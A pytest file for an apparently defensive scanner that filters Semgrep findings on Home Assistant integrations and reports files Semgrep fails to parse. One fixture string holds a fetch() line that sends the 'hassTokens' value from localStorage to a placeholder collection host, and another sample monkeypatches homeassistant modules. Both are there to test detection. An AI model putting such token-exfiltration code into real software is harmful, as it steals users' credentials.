"""Post-filters on Semgrep results (parsed with ast, never run)."""

from pathlib import Path

from conftest import requires_semgrep

from sniff_test.analyzers import semgrep
from sniff_test.models import RULE_FILE_NOT_CHECKED, Category, Finding, Severity

SRC = """from homeassistant import config_entries
import homeassistant


async def flow(self, wrapper):
    config_entries = self.hass.config_entries.async_entries("x")
    a, *rest = config_entries
    x = homeassistant.helpers = wrapper
    setattr(homeassistant, "helpers", wrapper)
    homeassistant.core = wrapper
"""


def _f(line, file="cf.py", rule="ha-monkeypatch"):
    return Finding(rule, "t", Severity.HIGH, Category.TAMPER, "m", file=file, line=line)


def test_monkeypatch_on_a_rebound_local_name_is_dropped(tmp_path):
    (tmp_path / "cf.py").write_text(SRC)
    trees: dict = {}
    drop = semgrep._only_rebinds_names
    assert drop(_f(6), tmp_path, trees)  # the shape seen in a real integration
    assert drop(_f(7), tmp_path, trees)  # tuple / starred names
    assert not drop(_f(8), tmp_path, trees)  # chained: also patches homeassistant.helpers
    assert not drop(_f(9), tmp_path, trees)  # setattr is never dropped
    assert not drop(_f(10), tmp_path, trees)
    assert not drop(_f(6, rule="py-eval-exec"), tmp_path, trees)  # other rules untouched


def test_unparseable_files_keep_the_finding(tmp_path):
    (tmp_path / "bad.py").write_text("config_entries = (\n")
    assert not semgrep._only_rebinds_names(_f(1, "bad.py"), tmp_path, {})
    assert not semgrep._only_rebinds_names(_f(1, "missing.py"), tmp_path, {})


@requires_semgrep
def test_semgrep_still_matches_the_shape_we_filter(tmp_path):
    """If Semgrep stops resolving the shadowed import, this filter has nothing to do."""
    import json
    import subprocess

    (tmp_path / "cf.py").write_text(SRC)
    run = tmp_path / "run"
    run.mkdir()
    out = subprocess.run(
        ["semgrep", "scan", "--config", str(semgrep.rules_dir() / "python" / "tamper.yaml"),
         "--json", "--metrics=off", "--disable-version-check", str(tmp_path / "cf.py")],
        cwd=run, capture_output=True, text=True, check=False,
    )  # fmt: skip
    lines = sorted(r["start"]["line"] for r in json.loads(out.stdout)["results"])
    assert 6 in lines and 10 in lines
    # Semgrep (1.181, and still 1.185) doesn't match chained
    # `x = homeassistant.helpers = v`; py_tamper (ast) covers it and the other missed
    # forms (tests/test_py_tamper.py).
    assert 8 not in lines


@requires_semgrep
def test_raw_fstring_beside_new_syntax_no_longer_hides_a_file(tmp_path):
    """Semgrep 1.181 failed on any file with both an `rf"..."` string and Python 3.12
    syntax (a `type` statement, `def g[T]`): "Syntax error", no rule ran on the file
    (two files of a real integration). Fixed upstream in
    1.183; the image ships 1.185. Two harmless lines must never hide a file again."""
    import json
    import subprocess

    (tmp_path / "t.py").write_text(
        'import homeassistant\n\nP = "x"\nR = rf"^{P}$"\n\ntype A = int\n\n\n'
        "def g[T](x: T) -> T:\n    return x\n\n\ndef f(w):\n    homeassistant.a = w\n"
    )
    run = tmp_path / "run"
    run.mkdir()
    out = subprocess.run(
        ["semgrep", "scan", "--config", str(semgrep.rules_dir() / "python" / "tamper.yaml"),
         "--json", "--metrics=off", "--disable-version-check", str(tmp_path / "t.py")],
        cwd=run, capture_output=True, text=True, check=False,
    )  # fmt: skip
    data = json.loads(out.stdout)
    assert data["errors"] == []
    assert [r["start"]["line"] for r in data["results"]] == [14]


def _err(kind, path, spans=None):
    return {"type": [kind, spans] if spans is not None else kind, "path": str(path)}


def _span(start, end):
    return {"start": {"line": 1, "col": 1, "offset": start}, "end": {"offset": end}}


def _parse_rules(errors, root):
    return sorted((f.file, f.rule_id, str(f.severity)) for f in
                  semgrep._parse_error_findings(errors, root))  # fmt: skip


def test_a_file_no_rule_read_is_its_own_finding(tmp_path):
    """Semgrep says which it was: "Syntax error" (nothing checked) or PartialParsing with
    the skipped spans. Only a small gap stays the low `scan-parse-error`."""
    for name in ("unread.js", "gap.js", "whole.js", "nospans.js", "both.py", "types.d.ts"):
        (tmp_path / name).write_text("x" * 1000)
    errors = [
        _err("Syntax error", tmp_path / "unread.js"),
        _err("PartialParsing", tmp_path / "gap.js", [_span(0, 6), _span(0, 1)]),
        _err("PartialParsing", tmp_path / "whole.js", [_span(0, 1000)]),
        _err("PartialParsing", tmp_path / "nospans.js", []),
        _err("PartialParsing", tmp_path / "both.py", [_span(0, 3)]),
        _err("Other syntax error", tmp_path / "both.py"),
        _err("Syntax error", tmp_path / "types.d.ts"),  # declarations never run
        _err("Syntax error", tmp_path / "notes.md"),  # not code
        _err("Timeout", tmp_path / "gap.js"),
    ]
    assert _parse_rules(errors, tmp_path) == [
        ("both.py", RULE_FILE_NOT_CHECKED, "medium"),
        ("gap.js", "scan-parse-error", "low"),
        ("nospans.js", RULE_FILE_NOT_CHECKED, "medium"),
        ("types.d.ts", "scan-parse-error", "low"),
        ("unread.js", RULE_FILE_NOT_CHECKED, "medium"),
        ("whole.js", RULE_FILE_NOT_CHECKED, "medium"),
    ]


def test_an_engine_that_gave_up_leaves_the_scan_incomplete():
    """Out of memory or a crash on a file may not repeat: that is "didn't finish"
    (retried), not a finding. A parse failure repeats, so it isn't counted here."""
    names = ["Timeout", "Out of memory", "Stack overflow", "Fatal error", "Syntax error"]
    errors = [{"type": n} for n in names] + [{"type": ["PartialParsing", []]}]
    assert semgrep._unfinished(errors) == (1, 3)
    assert semgrep._unfinished([{"type": "Syntax error"}]) == (0, 0)


# Reduced from HACS 2.0.5's hacs_frontend/frontend_latest/1117.4a5305eb6e7fdca3.js (1.65 MB,
# CodeMirror): a class minified to the name `as`, and an arrow function whose body is a
# function called on the spot. Valid JavaScript; each line alone parses.
_UNREADABLE_JS = (
    "function m(t){ return new as(t, -1) }\n"
    "function Us(n){ return n.map((t => function(t, e){ return t }(t, 1))) }\n"
)
_TOKEN_JS = 'fetch("https://collect.invalid/c", {body: localStorage.getItem("hassTokens")});\n'


@requires_semgrep
def test_semgrep_cannot_read_this_file_and_we_say_so(tmp_path):
    """On Semgrep 1.185 no rule runs on the first file (0 results, "Syntax error"), or on
    the second, which comes back as PartialParsing with one span over the whole file. If a
    newer Semgrep parses them, this fails: re-run the noise set's parse-error count."""
    import json
    import subprocess

    (tmp_path / "a.js").write_text(_UNREADABLE_JS + _TOKEN_JS)
    (tmp_path / "b.js").write_text(_UNREADABLE_JS.replace("-1", "1") + _TOKEN_JS)
    (tmp_path / "c.js").write_text("var x = n?.5:1;\n" + _TOKEN_JS * 20)  # the cards' small gap
    run = tmp_path / "run"
    run.mkdir()
    out = subprocess.run(
        ["semgrep", "scan", "--config", str(semgrep.rules_dir() / "js"), "--json",
         "--metrics=off", "--disable-version-check", "--no-git-ignore",
         *(str(tmp_path / n) for n in ("a.js", "b.js", "c.js"))],
        cwd=run, capture_output=True, text=True, check=False,
    )  # fmt: skip
    data = json.loads(out.stdout)
    hit = {Path(r["path"]).name for r in data["results"]}
    assert hit == {"c.js"}  # the token line is found only where the file was read
    kinds = {Path(e["path"]).name: semgrep._error_type(e) for e in data["errors"]}
    assert kinds == {"a.js": "Syntax error", "b.js": "PartialParsing", "c.js": "PartialParsing"}
    assert _parse_rules(data["errors"], tmp_path) == [
        ("a.js", RULE_FILE_NOT_CHECKED, "medium"),
        ("b.js", RULE_FILE_NOT_CHECKED, "medium"),
        ("c.js", "scan-parse-error", "low"),
    ]
